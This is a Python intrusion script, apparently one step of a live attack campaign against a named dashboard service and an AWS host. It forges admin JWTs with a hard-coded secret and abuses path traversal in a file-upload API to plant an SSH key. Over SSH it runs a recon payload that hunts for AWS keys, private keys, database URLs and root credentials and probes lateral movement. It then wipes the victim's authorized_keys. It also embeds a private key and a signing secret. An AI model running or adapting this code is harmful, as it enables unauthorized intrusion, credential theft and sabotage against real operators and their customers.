#!/usr/bin/env python3
# i29233 step 3c: final loot of the AWS agent host (intelora12) as root; then neutralize the implanted key.
import os, sys, json, base64, hmac, hashlib, subprocess, random
import urllib.parse as up
HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
AGENT = "agent-0cf829f4"; AUID = "4b4f439e-74f7-11f1-ac43-525400595be1"; ACUST = "tianyue"; AIP = "54.179.173.218"
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)
def sh(a, timeout=90):
    try:
        r = subprocess.run(a, capture_output=True, timeout=timeout); return r.returncode, r.stdout.decode("utf-8","replace"), r.stderr.decode("utf-8","replace")
    except Exception as e: return -1, "", repr(e)
def curl(args, timeout=40): return sh(["curl","-s","-k","-m",str(timeout)]+args, timeout=timeout+15)
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge(p):
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":"))); pl=b64u(json.dumps(p,separators=(",",":")))
    return h+"."+pl+"."+b64u(hmac.new(JWT_SECRET.encode(),(h+"."+pl).encode(),hashlib.sha256).digest())
def tok_for(uid,cust): return forge({"userId":uid,"email":"probe@x","customer":cust,"role":"admin"})
def call(path,cookie=None,timeout=30,maxlen=20000):
    a=["--http2","-A",UA,"-H","Accept: application/json","-w","\n__CODE__%{http_code}"]
    if cookie: a+=["-H","Cookie: session="+cookie]
    a+=["https://%s%s"%(HOST,path)]
    rc,out,err=curl(a,timeout=timeout); i=out.rfind("__CODE__"); code=""; txt=out
    if i>=0: code=out[i+8:].strip()[:3]; txt=out[:i]
    return {"code":code,"body":txt[:maxlen]}
def files_read(aid,path,tok,maxlen=20000): return call("/api/agents/%s/files?action=read&path=%s"%(aid,up.quote(path,safe="/")),cookie=tok,maxlen=maxlen)
def upload(aid,tok,path,name,content,timeout=60):
    tmp="/tmp/u_%d"%random.randint(1000,999999); open(tmp,"wb").write(content.encode() if isinstance(content,str) else content)
    url="https://%s/api/agents/%s/files/upload?path=%s"%(HOST,aid,up.quote(path,safe="/"))
    rc,out,err=curl(["--http2","-A",UA,"-H","Authorization: Bearer "+tok,"-w","\n__CODE__%{http_code}","-F","files=@%s;filename=%s"%(tmp,name),url],timeout=timeout)
    i=out.rfind("__CODE__"); code=""; txt=out
    if i>=0: code=out[i+8:].strip()[:3]; txt=out[:i]
    return {"code":code,"body":txt[:800]}

RECON = r'''
set +e
echo "=== coder home ==="; ls -la /home/coder 2>&1 | head -40
echo "=== decart ==="; cat /home/coder/.decart.env 2>&1 | head -20
echo "=== dirs ==="; for d in .gstack attachments .lumii .claude .config .local; do echo "-- $d --"; ls -la /home/coder/$d 2>&1 | head -12; done
echo "=== grep secrets in coder workspace ==="
grep -rIEa 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|JWT_SECRET|postgres://|mysql://|redis://|s3://[a-z0-9.-]+|0x[0-9a-fA-F]{64}|BEGIN [A-Z ]*PRIVATE KEY' /home/coder/.gstack /home/coder/.decart.env /home/coder/attachments /home/coder/.lumii /home/coder/.config 2>/dev/null | cut -c1-260 | head -50
echo "=== claude transcript hits ==="
grep -rIEa 's3://[a-z0-9.-]+|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|roleArn|assumed-role' /home/coder/.claude 2>/dev/null | cut -c1-240 | sort -u | head -40
echo "=== root/systemd ==="; sudo -n ls -la /root 2>&1 | head -15
echo "--- root history/aws ---"; sudo -n sh -c 'tail -30 /root/.bash_history 2>/dev/null; cat /root/.aws/credentials /root/.aws/config 2>/dev/null' | cut -c1-220
echo "--- services ---"; systemctl list-units --type=service --state=running --no-pager 2>/dev/null | head -20
echo "--- lumii units ---"; sudo -n sh -c 'ls /etc/systemd/system/ | grep -iE "lumii|agent|keeper"; for f in /etc/systemd/system/*lumii* /etc/systemd/system/*agent* /etc/systemd/system/*keeper*; do echo "## $f"; head -30 "$f"; done' 2>/dev/null | head -90
echo "=== cloud-init log ==="; sudo -n sh -c 'grep -iE "token|secret|password|curl|wget|http" /var/log/cloud-init-output.log 2>/dev/null | cut -c1-220 | tail -25'
echo "=== opt/srv ==="; sudo -n ls -la /opt /srv /data 2>&1 | head -20
echo "=== env files (maxdepth4) ==="; sudo -n sh -c 'find / -maxdepth 4 \( -name "*.env" -o -name ".env*" -o -name "*credential*" \) -not -path "*/node_modules/*" -not -path "/proc/*" 2>/dev/null | head -20'
echo "=== intra-vpc hop test 172.31.26.221 ==="; cp /tmp/k29233b /tmp/hopk 2>/dev/null; chmod 600 /tmp/hopk 2>/dev/null; timeout 8 ssh -i /tmp/hopk -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null coder@172.31.26.221 'id;hostname' 2>&1 | head -3
echo "=== END ==="
'''

KP_B64 = "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBUnA1S0NGVkJqbmQrV3ZScGVNZkJhclhucksrRFNUWnU3bDFiWnhnTnp0d0FBQUpBZkhXeFZIeDFzClZRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQVJwNUtDRlZCam5kK1d2UnBlTWZCYXJYbnJLK0RTVFp1N2wxYlp4Z056dHcKQUFBRUN4TzluZHltcklQVmxlUDF0dlZ3cWNmL0FDczJrSVk0NlRWNVdKenh0dDFCR25rb0lWVUdPZDM1YTlHbDR4OEZxdAplZXNyNE5KTm03dVhWdG5HQTNPM0FBQUFCMmt5T1RJek0ySUJBZ01FQlFZPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
PUB = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBGnkoIVUGOd35a9Gl4x8Fqteesr4NJNm7uXVtnGA3O3 i29233b"

def main():
    open("/tmp/k29233b","w").write(base64.b64decode(KP_B64).decode())
    os.chmod("/tmp/k29233b",0o600)
    open("/tmp/k29233b.pub","w").write(PUB+"\n")
    tok = tok_for(AUID, ACUST)
    cur = files_read(AGENT, "/home/lumii/.ssh/authorized_keys", tok, maxlen=8000)
    try: orig = json.loads(cur["body"]).get("content","") or ""
    except Exception: orig = ""
    R("upl_ensure", upload(AGENT, tok, "/home/lumii/.lumii-agent-keeper/../.ssh", "authorized_keys", (orig.rstrip("\n")+"\n" if orig.strip() else "")+PUB+"\n"))
    try:
        p = subprocess.run(["ssh","-i","/tmp/k29233b","-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=10","coder@"+AIP,"bash -s"],
                           input=RECON.encode(), capture_output=True, timeout=200)
        R("recon", {"rc": p.returncode, "out": p.stdout.decode("utf-8","replace")[:20000], "err": p.stderr.decode("utf-8","replace")[:400]})
    except Exception as e:
        R("recon_fail", repr(e))
    # neutralize: overwrite authorized_keys with empty content (no key authorized)
    R("neutralize", upload(AGENT, tok, "/home/lumii/.lumii-agent-keeper/../.ssh", "authorized_keys", ""))
    R("check_after", files_read(AGENT, "/home/lumii/.ssh/authorized_keys", tok, maxlen=600))

try: main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-2500:])
finally: sys.exit(1)
